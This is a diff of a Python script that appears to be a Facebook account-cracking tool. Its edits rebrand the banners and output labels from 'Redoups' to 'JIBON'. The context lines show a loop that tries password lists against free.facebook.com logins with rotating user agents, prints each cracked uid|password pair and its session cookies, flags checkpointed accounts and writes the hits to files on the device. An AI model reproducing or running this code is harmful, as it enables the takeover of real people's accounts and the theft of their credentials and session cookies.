@@ -82,19 +82,19 @@
      ugen.append(uaku2) 
  logo = (""" 
   
-     .S   .____  _____ ____     ___  _   _ ____  ____    _   _    _    ____ _  __
+     ____  _____ ____     ___  _   _ ____  ____    _   _    _    ____ _  __
 |  _ \| ____|  _ \   / _ \| | | |  _ \/ ___|  | | | |  / \  / ___| |/ /
 | |_) |  _| | | | | | | | | | | | |_) \___ \  | |_| | / _ \| |   | ' /
 |  _ <| |___| |_| | | |_| | |_| |  __/ ___) | |  _  |/ ___ \ |___| . \
-|_| \_\_____|____/   \___/ \___/|_|   |____/  |_| |_/_/   \_\____|_|\_\
+|_| \_\_____|____/   \___/ \___/|_|   |____/  |_| |_/_/   \_\____|_
                                                     
                                                    
- \033[1;91m\033[1;41m\033[1;97m              WELCOME TO Redoups TOOLS               \033[;0m\033[1;91m\033[1;92m 
+ \033[1;91m\033[1;41m\033[1;97m              WELCOME TO JIBON TOOLS               \033[;0m\033[1;91m\033[1;92m 
   
  \033[1;92m══════════════════════════════════════════ 
  \033[1;32m[-] TOOLS TYPE:\033[1;32m PAID 
- \033[1;32m[-] AUTHOR    :\033[1;32m Redoups ISLAM 
- \033[1;32m[-] GITHUB    :\033[1;32m MRXRedhack
+ \033[1;32m[-] AUTHOR    :\033[1;32m JIBON ISLAM 
+ \033[1;32m[-] GITHUB    :\033[1;32m MRXJIBON 
  \033[1;32m[-] FACEBOOK  :\033[1;32m J  I  B  O  N 
  \033[1;92m══════════════════════════════════════════ 
   
@@ -228,7 +228,7 @@
          for ps in pwx: 
              pro = random.choice(ugen) 
              session = requests.Session() 
-             sys.stdout.write('\r[\033[1;92mRedoups\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))), 
+             sys.stdout.write('\r[\033[1;92mJIBON\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))), 
              sys.stdout.flush() 
              free_fb = session.get('https://free.facebook.com').text 
              log_data = { 
@@ -264,7 +264,7 @@
              if 'c_user' in log_cookies: 
                  coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]) 
                  cid = coki[7:22] 
-                 print(f"\033[38;5;46m[REDOUPSHACK-OK🌻] {uid}|{ps}") 
+                 print(f"\033[38;5;46m[JIBON-OK🌻] {uid}|{ps}") 
                  print(f"\n[COOKIE🎁] : {coki}") 
                  open('/sdcard/JIBON/ok.txt', 'a').write( uid+' | '+ps+'\n') 
                  oks.append(uid) 
@@ -272,14 +272,14 @@
              elif 'checkpoint' in log_cookies: 
                  coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]) 
                  cid = coki[82:97] 
-                 print(f"\x1b[38;5;196m[REDOUPSHACK-CP❌] {uid}|{ps}") 
-                 open('/sdcard/Redoups-CP.txt', 'a').write( uid+' | '+ps+' \n') 
+                 print(f"\x1b[38;5;196m[JIBON-CP❌] {uid}|{ps}") 
+                 open('/sdcard/JIBON-CP.txt', 'a').write( uid+' | '+ps+' \n') 
                  cps.append(uid) 
                  break 
              else: 
                  continue 
          loop+=1 
-         sys.stdout.write(f'\r\033[m[REDOUPS-HACK💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))), 
+         sys.stdout.write(f'\r\033[m[JIBON-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))), 
          sys.stdout.flush() 
      except: 
          pass 
